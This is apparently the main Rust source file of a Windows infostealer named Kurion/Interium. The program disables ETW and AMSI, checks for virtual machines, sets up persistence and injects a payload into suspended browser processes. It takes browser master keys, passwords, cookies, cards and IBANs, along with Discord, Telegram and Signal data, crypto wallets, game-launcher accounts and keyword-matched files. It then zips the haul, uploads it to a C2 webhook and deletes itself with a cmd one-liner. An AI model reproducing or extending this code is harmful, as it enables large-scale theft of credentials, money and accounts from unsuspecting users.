#![cfg_attr(not(feature = "debug_console"), windows_subsystem = "windows")]

include!(concat!(env!("OUT_DIR"), "/entropy.rs"));
include!(concat!(env!("OUT_DIR"), "/embedded_payload.rs"));
include!(concat!(env!("OUT_DIR"), "/build_config.rs"));
include!(concat!(env!("OUT_DIR"), "/obf_browser_strings.rs"));

pub(crate) fn deobf(data: &[u8]) -> String {
    data.iter().enumerate()
        .map(|(i, &b)| (b ^ PAYLOAD_KEY[i % PAYLOAD_KEY.len()]) as char)
        .collect()
}

use obfstr::obfstr;

mod injector;
mod c2;
mod sysinfo;
mod desktop;

use std::path::PathBuf;
use windows::Win32::System::Threading::CreateMutexW;
use windows::Win32::Foundation::{GetLastError, ERROR_ALREADY_EXISTS};
use windows::core::PCWSTR;

use kurion_core::console::Console;
use crate::injector::{BrowserDiscovery, BrowserInfo, browser_discovery::g_user_data_dir};

struct GlobalStats {
    successful: usize,
    failed: usize,
    skipped: usize,
}

#[derive(serde::Serialize, Clone)]
struct InitConfig {
    pub browser_type: String,
    pub output_path: String,
    pub verbose: bool,
    pub fingerprint: bool,
    pub c_url: String,
}

struct Args {
    target: String,
    verbose: bool,
    fingerprint: bool,
    kill: bool,
    output_path: PathBuf,
    webhook: Option<String>,
}

fn p_file_search_keywords(raw: &str) -> Vec<String> {
    raw.split(',')
        .map(str::trim)
        .filter(|k| !k.is_empty())
        .map(str::to_string)
        .collect()
}

fn r_file_search_config() -> (bool, Vec<String>) {
    let enabled_value = std::env::var(obfstr!("KURION_FILE_SEARCH_ENABLED"))
        .ok()
        .or_else(|| option_env!("KURION_FILE_SEARCH_ENABLED").map(str::to_string));
    let enabled = enabled_value
        .map(|v| {
            let s = v.trim();
            s.eq_ignore_ascii_case("true")
                || s.eq_ignore_ascii_case("1")
                || s.eq_ignore_ascii_case("yes")
                || s.eq_ignore_ascii_case("on")
        })
        .unwrap_or(false);

    let keywords_value = std::env::var(obfstr!("KURION_FILE_SEARCH_KEYWORDS"))
        .ok()
        .or_else(|| option_env!("KURION_FILE_SEARCH_KEYWORDS").map(str::to_string));
    let keywords = keywords_value
        .map(|v| p_file_search_keywords(&v))
        .unwrap_or_default();

    (enabled, keywords)
}

impl Args {
    fn parse() -> Self {
        let args: Vec<String> = std::env::args().collect();
        
        if args.len() < 2 {
            return Args {
                target: "all".to_string(),
                verbose: false,
                fingerprint: false,
                kill: false,
                output_path: std::env::temp_dir().join(obfstr!("Kurion-Result")),
                webhook: None,
            };
        }

        let mut result = Args {
            target: String::new(),
            verbose: false,
            fingerprint: false,
            kill: false,
            output_path: PathBuf::from(obfstr!("./Kurion-Result")),
            webhook: None,
        };

        let mut i = 1;
        while i < args.len() {
            match args[i].as_str() {
                "-v" | "--verbose" => result.verbose = true,
                "-f" | "--fingerprint" => result.fingerprint = true,
                "-k" | "--kill" => result.kill = true,
                "-o" | "--output-path" => {
                    i += 1;
                    if i < args.len() {
                        result.output_path = PathBuf::from(&args[i]);
                    }
                }
                "--webhook" => {
                    i += 1;
                    if i < args.len() {
                        result.webhook = Some(args[i].clone());
                    }
                }
                s if !s.starts_with('-') && result.target.is_empty() => {
                    result.target = s.to_string();
                }
                _ => {}
            }
            i += 1;
        }

        result
    }
}

fn p_browser(
    browser: &BrowserInfo,
    target: &str,
    verbose: bool,
    _fingerprint: bool,
    _kill_first: bool,
    output: &PathBuf,
    console: &Console,
    stats: &mut GlobalStats,
) {

    let user_data_dir = match g_user_data_dir(&browser.browser_type) {
        Some(dir) => dir,
        None => {
            console.error("User data directory not found");
            stats.failed += 1;
            return;
        }
    };

    /*
    let local_state = user_data_dir.join("Local State");
    let master_key = match read_master_key(&local_state) {
        Ok(key) => key,
        Err(e) => {
            console.error(&format!("Failed to read master key: {}", e));
            stats.failed += 1;
            return;
        }
    };

    if verbose {
        console.decryption_key(&master_key);
    } else {
        println!("  │ Decryption Key");
        println!("  │ {}", hex::encode(&master_key).to_uppercase());
        println!("  │");
    }
    */
    
    let profiles = f_profiles(&user_data_dir);
    if profiles.is_empty() {
        console.warn("No profiles found");
        stats.skipped += 1;
        return;
    }
    
    use crate::injector::process_manager::ProcessManager;
    use crate::injector::injector::PayloadInjector;
    use crate::injector::pipe_server::PipeServer;
    
    console.info("Initializing IPC server...");
    let mut pipe_server = PipeServer::new(target);
    if let Err(e) = pipe_server.create() {
        console.error(&format!("Failed to create named pipe: {}", e));
        stats.failed += 1;
        return;
    }
    let pipe_name = pipe_server.g_name();

    console.info("Launching browser (suspended)...");
    let mut proc_mgr = ProcessManager::new(browser.clone());
    if let Err(e) = proc_mgr.c_suspended() {
        console.error(&format!("Failed to create suspended process: {}", e));
        stats.failed += 1;
        return;
    }
    console.debug(&format!("Created process PID: {}", proc_mgr.g_pid()));
    
    console.info("Injecting payload...");
    let injector = PayloadInjector::new(&proc_mgr);
    
    if let Err(e) = injector.inject(pipe_name) {
        console.error(&format!("Injection failed: {}", e));
        proc_mgr.terminate();
        stats.failed += 1;
        return;
    }
    console.success("Payload injected");
    
    console.info("Waiting for payload connection...");
    if let Err(e) = pipe_server.w_for_client() {
         console.error(&format!("Failed to connect pipe: {}", e));
    } else {
        console.success("Payload connected! Sending config...");
        
        let config = InitConfig {
            browser_type: browser.browser_type.clone(),
            output_path: output.to_string_lossy().to_string(),
            verbose,
            fingerprint: _fingerprint,
            c_url: String::new(),
        };
        
        let config_json = serde_json::to_vec(&config).unwrap_or_default();

        if let Err(e) = pipe_server.s_message(&config_json) {
            console.error(&format!("Failed to send config: {}", e));
        } else {
             console.info("Config sent. Waiting for payload...");
             
             loop {
                 match pipe_server.r_message() {
                    Ok(msg) => {
                        if msg == obfstr!("DONE") {
                             console.success(obfstr!("Payload finished."));
                             break;
                         } else if msg.starts_with(obfstr!("KEY:")) {
                             let hex_key = &msg[4..];
                             console.success(obfstr!("Received Master Key from Payload!"));
                             console.decryption_key(&hex::decode(hex_key).unwrap_or_default());
                             stats.successful += 1;
                         } else if msg.starts_with(obfstr!("PROFILE:")) {
                              console.info(&format!("{}{}", obfstr!("Profile: "), &msg[8..]));
                         } else if msg.starts_with(obfstr!("COOKIES:")) {
                              let parts: Vec<&str> = msg.split(':').collect();
                              if parts.len() >= 3 {
                                  console.info(&format!("{}{} / {}", obfstr!("Cookies extracted: "), parts[1], parts[2]));
                              }
                         } else if msg.starts_with(obfstr!("PASSWORDS:")) {
                              console.info(&format!("{}{}", obfstr!("Passwords extracted: "), &msg[10..]));
                         } else if msg.starts_with(obfstr!("CARDS:")) {
                              console.info(&format!("{}{}", obfstr!("Credit Cards extracted: "), &msg[6..]));
                         } else if msg.starts_with(obfstr!("IBANS:")) {
                              console.info(&format!("{}{}", obfstr!("IBANs extracted: "), &msg[6..]));
                         } else if msg.starts_with(obfstr!("TOKENS:")) {
                              console.info(&format!("{}{}", obfstr!("Tokens extracted: "), &msg[7..]));
                         } else if msg.starts_with(obfstr!("ASTER_KEY:")) {
                              let hex_key = &msg[10..];
                              console.success(obfstr!("Received Aster Key (Edge Copilot)"));
                              console.decryption_key(&hex::decode(hex_key).unwrap_or_default());
                         } else if msg.starts_with(obfstr!("BOOKMARKS:")) {
                             console.info(&format!("{}{}", obfstr!("Bookmarks extracted: "), &msg[10..]));
                         } else if msg.starts_with(obfstr!("SOCIALS:")) {
                             console.info(&format!("{}{}", obfstr!("Socials extracted: "), &msg[8..]));
                         } else if msg.starts_with(obfstr!("WALLETS:")) {
                             console.info(&format!("{}{}", obfstr!("Wallets extracted: "), &msg[8..]));
                         } else if msg.starts_with(obfstr!("GAMES:")) {
                             console.info(&format!("{}{}", obfstr!("Games extracted: "), &msg[6..]));
                        } else if msg.starts_with(obfstr!("[-]")) {
                            console.error(&format!("Payload error: {}", msg));
                            stats.failed += 1;
                        } else {
                            console.info(&msg);
                        }
                    },
                    Err(e) => {
                        console.error(&format!("Pipe read error (or disconnect): {}", e));
                        break;
                    },
                }
             }
        }
    }
    
    proc_mgr.terminate();

}

fn f_profiles(user_data_dir: &PathBuf) -> Vec<String> {
    let mut profiles = Vec::new();

    if user_data_dir.join("Default").join("Preferences").exists() {
        profiles.push("Default".to_string());
    }

    if let Ok(entries) = std::fs::read_dir(user_data_dir) {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            if name.starts_with("Profile ") {
                if entry.path().join("Preferences").exists() {
                    profiles.push(name);
                }
            }
        }
    }

    profiles.sort();
    profiles
}

struct ConsoleReporter {
    console: Console,
}

impl ConsoleReporter {
    fn new(verbose: bool) -> Self {
        Self { console: Console::new(verbose) }
    }
}

use kurion_extractor::{ExtractionReporter, DataExtractor};

impl ExtractionReporter for ConsoleReporter {
    fn r_profile(&mut self, name: &str) {
        self.console.info(&format!("{}{}", obfstr!("Processing Profile: "), name));
    }
    fn r_cookies(&mut self, count: usize, total: usize) {
        self.console.success(&format!("  {}{} / {}", obfstr!("Extracted Cookies: "), count, total));
    }
    fn r_passwords(&mut self, count: usize) {
        self.console.success(&format!("  {}{}", obfstr!("Extracted Passwords: "), count));
    }
    fn r_cards(&mut self, count: usize) {
        self.console.success(&format!("  {}{}", obfstr!("Extracted Cards: "), count));
    }
    fn r_ibans(&mut self, count: usize) {
        self.console.success(&format!("  {}{}", obfstr!("Extracted IBANs: "), count));
    }
    fn r_tokens(&mut self, count: usize) {
        self.console.success(&format!("  {}{}", obfstr!("Extracted Tokens: "), count));
    }
    fn r_bookmarks(&mut self, count: usize) {
        self.console.success(&format!("  {}{}", obfstr!("Extracted Bookmarks: "), count));
    }
}

fn f_profiles_generic(user_data_dir: &std::path::Path) -> Vec<String> {
    let mut profiles = Vec::new();
    if user_data_dir.join("Default").join("Preferences").exists() {
        profiles.push("Default".to_string());
    }
    if let Ok(entries) = std::fs::read_dir(user_data_dir) {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            if name.starts_with("Profile ") {
                if entry.path().join("Preferences").exists() {
                    profiles.push(name);
                }
            }
        }
    }
    profiles
}

fn p_gecko_browser(
    browser_path: &PathBuf,
    console: &Console,
    stats: &mut GlobalStats,
    output_base: &PathBuf,
    verbose: bool,
) {
    use crate::injector::browser_discovery::f_gecko_profiles;

    let browser_name = browser_path.file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("Unknown Gecko Browser");

    console.b_header(&format!("{} (Gecko)", browser_name), "");

    let profiles = f_gecko_profiles(browser_path);

    if profiles.is_empty() {
        console.warn("No Gecko profiles found");
        stats.skipped += 1;
        return;
    }

    let mut reporter = ConsoleReporter::new(verbose);
    let mut extractor = DataExtractor::new(Vec::new(), output_base.clone(), &mut reporter);

    let mut any_extracted = false;

    for profile_path in profiles {
        let _profile_name = profile_path.file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("Unknown");

        let extraction_stats = extractor.p_profile(&profile_path, browser_name, "Gecko");

        if extraction_stats.cookies > 0 || extraction_stats.passwords > 0 {
            any_extracted = true;
        }
    }

    if any_extracted {
        stats.successful += 1;
    } else {
        stats.skipped += 1;
    }
}

fn p_offline_browser(
    path: &PathBuf,
    console: &Console,
    stats: &mut GlobalStats,
    output_base: &PathBuf,
    verbose: bool
) {
    let ud = deobf(BS_USER_DATA);
    let user_data = if path.join(&ud).exists() {
        path.join(&ud)
    } else if path.join("Local State").exists() {
        path.clone()
    } else {
        return;
    };

    let browser_name = path.file_name().unwrap_or_default().to_string_lossy();
    console.b_header(&format!("{} (Offline)", browser_name), "Unknown");

    let local_state = user_data.join("Local State");
    let master_key = match kurion_crypto::master_key::g_legacy_key(&local_state) {
        Ok(enc_key) => {
            match kurion_crypto::dpapi::u_data(&enc_key) {
                Ok(k) => k,
                Err(e) => {
                    console.error(&format!("DPAPI Decryption failed: {}", e));
                    stats.failed += 1;
                    return;
                }
            }
        },
        Err(e) => {
            console.error(&format!("Failed to extract master key: {}", e));
            stats.failed += 1;
            return;
        }
    };
    
    if verbose {
        console.decryption_key(&master_key);
    }

    let profiles = f_profiles_generic(&user_data);
    if profiles.is_empty() {
        console.error("No profiles found (looking for Default/Preferences file)");
        stats.failed += 1;
        return;
    }

    let mut reporter = ConsoleReporter::new(verbose);
    let mut extractor = DataExtractor::new(master_key, output_base.clone(), &mut reporter);
    
    let mut extracted_count = 0;
    for profile in profiles {
        let profile_path = user_data.join(&profile);
        let s = extractor.p_profile(&profile_path, &browser_name, "Chromium");
        if s.cookies > 0 || s.passwords > 0 || s.cards > 0 {
            extracted_count += 1;
        }
    }

    if extracted_count > 0 {
        stats.successful += 1;
    } else {
        stats.skipped += 1;
    }
}

fn s_output_counts(output_dir: &std::path::Path, grab: &mut c2::GrabSummary) {
    use walkdir::WalkDir;

    for entry in WalkDir::new(output_dir).into_iter().filter_map(|e| e.ok()) {
        let path = entry.path();
        if !path.is_file() { continue; }

        let fname = path.file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("");

        let count = || -> usize {
            let data = match std::fs::read_to_string(path) {
                Ok(d) => d,
                Err(_) => return 0,
            };
            match serde_json::from_str::<serde_json::Value>(&data) {
                Ok(serde_json::Value::Array(arr)) => arr.len(),
                _ => if data.trim().is_empty() { 0 } else { 1 },
            }
        };

        if fname.ends_with("_passwords.json") || fname == "passwords.json" {
            grab.passwords += count();
        } else if fname.ends_with("_cookies.json") || fname == "cookies.json" {
            grab.cookies += count();
        } else if fname.ends_with("_cards.json") || fname == "cards.json" {
            grab.cards += count();
        } else if fname.ends_with("_bookmarks.json") || fname == "bookmarks.json" {
            grab.bookmarks += count();
        }
    }
}

fn main() {
    // Set DPI awareness before any window creation (including decoy dialog)
    unsafe {
        #[link(name = "user32")]
        extern "system" {
            fn SetProcessDPIAware() -> i32;
        }
        SetProcessDPIAware();
    }

    #[cfg(feature = "debug_console")]
    unsafe {
        windows::Win32::System::Console::AllocConsole().ok();
    }

    let _mutex_handle = unsafe {
        let mutex_name = kurion_core::common::t_wide(obfstr!("Global\\InteriumSingleInstanceMutex"));
        let handle = CreateMutexW(None, true, PCWSTR(mutex_name.as_ptr()));
        if let Ok(ref _h) = handle {
            if GetLastError() == ERROR_ALREADY_EXISTS {
                return;
            }
        }
        handle
    };


    let args = Args::parse();
    let console = Console::new(args.verbose);
    console.banner();

    if args.verbose {
        console.info(&format!("Features: {}", build_config::f_str()));
        console.info(&format!("C2: {}", &build_config::c_url()));
    }

    let (file_search_enabled, file_search_keywords) = r_file_search_config();
    let any_feature_enabled = build_config::FEATURE_BROWSERS
        || build_config::FEATURE_GAMES
        || build_config::FEATURE_SOCIALS
        || build_config::FEATURE_WALLETS
        || build_config::FEATURE_INJECTION;

    if !any_feature_enabled && !file_search_enabled {
        console.error(obfstr!("No features enabled! Rebuild with KURION_FEATURES=browsers,games,..."));
        std::process::exit(1);
    }

    crate::injector::benign_imports::init();

    if !kurion_sys::internal_api::i_api(args.verbose) {
        console.error("Syscall initialization failed");
        std::process::exit(1);
    }

    unsafe {
        kurion_sys::evasion::p_etw();
        kurion_sys::evasion::p_amsi();
    }
    kurion_sys::evasion::a_hammer();

    if build_config::ANTI_VM {
        if kurion_sys::anti_analysis::r_all_anti_vm() {
            std::process::exit(0);
        }
    }

    if build_config::PERSIST {
        crate::injector::persistence::install();
    }

    std::fs::create_dir_all(&args.output_path).ok();

    if args.target == "list" {
        console.section("Chromium Browsers");
        for path in crate::injector::browser_discovery::g_chromium_browsers() {
            console.l_item(&path.display().to_string());
        }

        console.section("Gecko Browsers");
        for browser_path in crate::injector::browser_discovery::g_gecko_browsers() {
            console.l_item(&browser_path.display().to_string());
            for profile in crate::injector::browser_discovery::f_gecko_profiles(&browser_path) {
                console.s_item(&profile.display().to_string());
            }
        }
        return;
    }

    let mut stats = GlobalStats {
        successful: 0,
        failed: 0,
        skipped: 0,
    };
    let mut grab = c2::GrabSummary::default();

        if args.target == "all" {
        if build_config::FEATURE_BROWSERS {
        console.section("Browser Grabbing");
        
        let browsers = BrowserDiscovery::f_all();
        let mut processed_types = std::collections::HashSet::new();
        
        for browser in &browsers {
            console.p_target(&browser.display_name);
            let success_before = stats.successful;
            let failed_before = stats.failed;

            p_browser(browser, &args.target, args.verbose, args.fingerprint, args.kill, &args.output_path, &console, &mut stats);
            
            if stats.successful > success_before {
                console.s_target(&browser.display_name);
                if !grab.browser_names.contains(&browser.display_name) {
                    grab.browser_names.push(browser.display_name.clone());
                }
            } else if stats.failed > failed_before {
                console.f_target(&browser.display_name);
            } else {
                console.f_target(&browser.display_name);
            }
            
            processed_types.insert(browser.browser_type.to_lowercase());
        }
        
        let extended_browsers = crate::injector::browser_discovery::g_chromium_browsers();
        for path in extended_browsers {
            let path_str = path.to_string_lossy().to_lowercase();
            let browser_name = path.file_name().unwrap_or_default().to_string_lossy();

            if processed_types.contains("chrome") && path_str.contains("google") && path_str.contains("chrome") { continue; }
            if processed_types.contains("edge") && path_str.contains("microsoft") && path_str.contains("edge") { continue; }
            if processed_types.contains("brave") && path_str.contains("brave") { continue; }
            if processed_types.contains("opera-gx") && path_str.contains("opera") && path_str.contains("gx") { continue; }
            if processed_types.contains("opera") && path_str.contains("opera") && !path_str.contains("gx") { continue; }
            if processed_types.contains("vivaldi") && path_str.contains("vivaldi") { continue; }
            if processed_types.contains("yandex") && path_str.contains("yandex") { continue; }
            
            console.p_target(&format!("{} (Offline)", browser_name));
            let success_before = stats.successful;
            p_offline_browser(&path, &console, &mut stats, &args.output_path, args.verbose);
            if stats.successful > success_before {
                console.s_target(&format!("{} (Offline)", browser_name));
                let name = browser_name.to_string();
                if !grab.browser_names.contains(&name) {
                    grab.browser_names.push(name);
                }
            } else {
                console.f_target(&format!("{} (Offline)", browser_name));
            }
        }
        
        for browser_path in crate::injector::browser_discovery::g_gecko_browsers() {
            let browser_name = browser_path.file_name().unwrap_or_default().to_string_lossy();
            console.p_target(&format!("{} (Gecko)", browser_name));
            let success_before = stats.successful;
            p_gecko_browser(&browser_path, &console, &mut stats, &args.output_path, args.verbose);
            if stats.successful > success_before {
                 console.s_target(&format!("{} (Gecko)", browser_name));
                 let name = browser_name.to_string();
                 if !grab.browser_names.contains(&name) {
                     grab.browser_names.push(name);
                 }
            } else {
                 console.f_target(&format!("{} (Gecko)", browser_name));
            }
        }
        }

        console.separator();
        console.section("Parallel Extraction");
        console.info("Spawning extraction threads...");

        let sys_info = sysinfo::SystemInfo::collect();

        let desktop_h = {
            let out = args.output_path.clone();
            let si = sys_info.clone();
            std::thread::spawn(move || desktop::grab(&out, &si))
        };

        let discord_h = if build_config::FEATURE_SOCIALS {
            let out = args.output_path.clone();
            Some(std::thread::spawn(move || kurion_extractor::socials::e_discord(&out)))
        } else { None };

        let telegram_h = if build_config::FEATURE_SOCIALS {
            let out = args.output_path.clone();
            Some(std::thread::spawn(move || kurion_extractor::socials::e_telegram(&out)))
        } else { None };

        let signal_h = if build_config::FEATURE_SOCIALS {
            let out = args.output_path.clone();
            Some(std::thread::spawn(move || kurion_extractor::socials::e_signal(&out)))
        } else { None };

        let injection_h = if build_config::FEATURE_INJECTION {
            let webhook = args.webhook.clone()
                .or_else(|| {
                    let baked = build_config::i_webhook();
                    if baked.is_empty() { None } else { Some(baked) }
                });
            if webhook.is_some() {
                let wh = webhook.unwrap_or_default();
                Some(std::thread::spawn(move || {
                    let injector = crate::injector::discord::DiscordInjector::new(wh);
                    injector.inject()
                }))
            } else {
                None
            }
        } else { None };

        let wallets_h = if build_config::FEATURE_WALLETS {
            let out = args.output_path.clone();
            Some(std::thread::spawn(move || kurion_extractor::wallets::g_wallets(&out)))
        } else { None };

        let steam_h = if build_config::FEATURE_GAMES {
            let out = args.output_path.clone();
            Some(std::thread::spawn(move || kurion_extractor::games::steam::extract(&out)))
        } else { None };

        let epic_h = if build_config::FEATURE_GAMES {
            let out = args.output_path.clone();
            Some(std::thread::spawn(move || kurion_extractor::games::epic::extract(&out)))
        } else { None };

        let minecraft_h = if build_config::FEATURE_GAMES {
            let out = args.output_path.clone();
            Some(std::thread::spawn(move || kurion_extractor::games::minecraft::extract(&out)))
        } else { None };

        let battlenet_h = if build_config::FEATURE_GAMES {
            let out = args.output_path.clone();
            Some(std::thread::spawn(move || kurion_extractor::games::battlenet::extract(&out)))
        } else { None };

        let ubisoft_h = if build_config::FEATURE_GAMES {
            let out = args.output_path.clone();
            Some(std::thread::spawn(move || kurion_extractor::games::ubisoft::extract(&out)))
        } else { None };

        let ea_h = if build_config::FEATURE_GAMES {
            let out = args.output_path.clone();
            Some(std::thread::spawn(move || kurion_extractor::games::ea::extract(&out)))
        } else { None };

        let growtopia_h = if build_config::FEATURE_GAMES {
            let out = args.output_path.clone();
            Some(std::thread::spawn(move || kurion_extractor::games::growtopia::extract(&out)))
        } else { None };

        let roblox_h = if build_config::FEATURE_GAMES {
            let out = args.output_path.clone();
            Some(std::thread::spawn(move || kurion_extractor::games::roblox::extract(&out)))
        } else { None };

        let file_search_h: Option<std::thread::JoinHandle<Vec<String>>> = if file_search_enabled {
            let out = args.output_path.clone();
            let keywords = file_search_keywords.clone();
            Some(std::thread::spawn(move || {
                let keyword_refs: Vec<&str> = keywords.iter().map(String::as_str).collect();
                kurion_extractor::file_search::s_files_by_keyword(&keyword_refs, &out)
            }))
        } else { None };

        if let Some(h) = discord_h {
            console.p_target("Discord");
            let discord_tokens = h.join().unwrap_or(0);
            grab.discord_tokens = discord_tokens;
            if discord_tokens > 0 {
                console.info(&format!("{} token(s) extracted", discord_tokens));
                console.s_target("Discord");
            } else {
                console.f_target("Discord");
            }
        }

        if let Some(h) = telegram_h {
            console.p_target("Telegram");
            let ok = h.join().unwrap_or(false);
            grab.telegram = ok;
            if ok { console.s_target("Telegram"); }
            else { console.f_target("Telegram"); }
        }

        if let Some(h) = signal_h {
            console.p_target("Signal");
            let ok = h.join().unwrap_or(false);
            grab.signal = ok;
            if ok { console.s_target("Signal"); }
            else { console.f_target("Signal"); }
        }

        if let Some(h) = injection_h {
            console.p_target("Discord Injection");
            match h.join() {
                Ok(Ok(())) => {
                    console.s_target("Discord Injection");
                }
                Ok(Err(e)) => {
                    console.error(&format!("{}", e));
                    console.f_target("Discord Injection");
                }
                Err(_) => console.f_target("Discord Injection"),
            }
        }

        if let Some(h) = wallets_h {
            console.p_target("Wallets");
            if let Ok(wallet_stats) = h.join() {
                grab.wallet_names.extend(wallet_stats.desktop_wallets.iter().cloned());
                grab.wallet_names.extend(wallet_stats.browser_extensions.iter().cloned());
                if wallet_stats.desktop_wallets.is_empty() && wallet_stats.browser_extensions.is_empty() {
                    console.f_target("Wallets");
                } else {
                    console.s_target("Wallets");
                    for wallet in &wallet_stats.desktop_wallets {
                        console.s_target(wallet);
                    }
                    for ext in &wallet_stats.browser_extensions {
                        console.s_target(ext);
                    }
                }
            } else {
                console.f_target("Wallets");
            }
        }

        if let Some(h) = steam_h {
            console.p_target("Steam");
            if let Ok(steam_stats) = h.join() {
                grab.steam = steam_stats.files_extracted > 0 || steam_stats.tokens_found > 0;
                if grab.steam {
                    console.info(&format!("{} files, {} tokens", steam_stats.files_extracted, steam_stats.tokens_found));
                    console.s_target("Steam");
                } else {
                    console.f_target("Steam");
                }
            } else {
                console.f_target("Steam");
            }
        }

        if let Some(h) = epic_h {
            console.p_target("Epic Games");
            grab.epic = h.join().unwrap_or(0) > 0;
            if grab.epic { console.s_target("Epic Games"); }
            else { console.f_target("Epic Games"); }
        }

        if let Some(h) = minecraft_h {
            console.p_target("Minecraft");
            grab.minecraft = h.join().unwrap_or(0) > 0;
            if grab.minecraft { console.s_target("Minecraft"); }
            else { console.f_target("Minecraft"); }
        }

        if let Some(h) = battlenet_h {
            console.p_target("Battle.net");
            grab.battlenet = h.join().unwrap_or(0) > 0;
            if grab.battlenet { console.s_target("Battle.net"); }
            else { console.f_target("Battle.net"); }
        }

        if let Some(h) = ubisoft_h {
            console.p_target("Ubisoft");
            grab.ubisoft = h.join().unwrap_or(0) > 0;
            if grab.ubisoft { console.s_target("Ubisoft"); }
            else { console.f_target("Ubisoft"); }
        }

        if let Some(h) = ea_h {
            console.p_target("Electronic Arts");
            grab.ea = h.join().unwrap_or(0) > 0;
            if grab.ea { console.s_target("Electronic Arts"); }
            else { console.f_target("Electronic Arts"); }
        }

        if let Some(h) = growtopia_h {
            console.p_target("Growtopia");
            grab.growtopia = h.join().unwrap_or(0) > 0;
            if grab.growtopia { console.s_target("Growtopia"); }
            else { console.f_target("Growtopia"); }
        }

        if let Some(h) = roblox_h {
            console.p_target("Roblox");
            grab.roblox = h.join().unwrap_or(0) > 0;
            if grab.roblox { console.s_target("Roblox"); }
            else { console.f_target("Roblox"); }
        }

        if let Some(h) = file_search_h {
            console.p_target("File Search");
            match h.join() {
                Ok(results) => {
                    grab.files_grabbed = results.len();
                    if results.is_empty() {
                        console.f_target("File Search");
                    } else {
                        console.info(&format!("{} matching file(s) found", results.len()));
                        console.s_target("File Search");
                    }
                }
                Err(_) => console.f_target("File Search"),
            }
        }

        let _ = desktop_h.join();

        s_output_counts(&args.output_path, &mut grab);

        let has_extraction = build_config::FEATURE_BROWSERS || build_config::FEATURE_GAMES
            || build_config::FEATURE_SOCIALS || build_config::FEATURE_WALLETS
            || build_config::FEATURE_INJECTION || file_search_enabled;
        if !&build_config::c_url().is_empty() && has_extraction {
            console.separator();
            console.section("C2 Exfiltration");
            console.p_target("C2 Upload");

            console.info("Zipping all extraction results...");

            let timestamp = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs();
            let zip_filename = format!("{}_{}.zip", obfstr!("interium"), timestamp);
            let zip_path = args.output_path.parent()
                .unwrap_or(&args.output_path)
                .join(&zip_filename);

            match c2::z_directory(&args.output_path, &zip_path) {
                Ok(_) => {
                    console.info(&format!("Created archive: {}", zip_filename));
                    console.info("Uploading...");

                    let c2_result = c2::u_to_discord(
                        &build_config::c_url(),
                        &zip_path, &zip_filename, &sys_info, &grab,
                    );

                    match c2_result {
                        Ok(_) => {
                            console.s_target("C2 Upload");
                            std::thread::sleep(std::time::Duration::from_millis(500));
                            let _ = std::fs::remove_file(&zip_path);
                            let _ = std::fs::remove_dir_all(&args.output_path);
                        }
                        Err(e) => {
                            console.error(&format!("Upload failed: {}", e));
                            console.f_target("C2 Upload");
                        }
                    }
                }
                Err(e) => {
                    console.error(&format!("Zip failed: {}", e));
                    console.f_target("C2 Upload");
                }
            }
        }
    } else if args.target == "offline" {
        let browsers = crate::injector::browser_discovery::g_chromium_browsers();
        for path in browsers {
             p_offline_browser(&path, &console, &mut stats, &args.output_path, args.verbose);
        }
    } else if args.target == obfstr!("discord") {
        if let Some(ref webhook) = args.webhook {
            console.info(obfstr!("Starting Discord Injection..."));
            let injector = crate::injector::discord::DiscordInjector::new(webhook.clone());
            match injector.inject() {
                Ok(_) => console.success(obfstr!("Discord injection completed (or scheduled)")),
                Err(e) => console.error(&format!("{}{}", obfstr!("Discord injection failed: "), e)),
            }
        } else {
            console.error(obfstr!("Webhook URL required for Discord injection (--webhook <URL>)"));
            std::process::exit(1);
        }
    } else {
        match BrowserDiscovery::f_specific(&args.target) {
             Some(browser) => {
                p_browser(&browser, &args.target, args.verbose, args.fingerprint, args.kill, &args.output_path, &console, &mut stats);
            }
            None => {
                console.error(&format!("Browser not found: {}", args.target));
                std::process::exit(1);
            }
        }
    }

    // Discord injection now runs in the parallel extraction block above


    if build_config::SELF_DELETE {
        if let Ok(exe_path) = std::env::current_exe() {
            use std::os::windows::process::CommandExt;
            let _ = std::process::Command::new("cmd")
                .args(["/C", "ping", "localhost", "-n", "2", ">", "nul", "&", "del", "/F", "/Q"])
                .arg(&exe_path)
                .creation_flags(0x08000000)
                .spawn();
        }
    }

    #[cfg(feature = "debug_console")]
    {
        println!("\n[DEBUG] Execution complete. Press Enter to exit...");
        let _ = std::io::stdin().read_line(&mut String::new());
    }
}
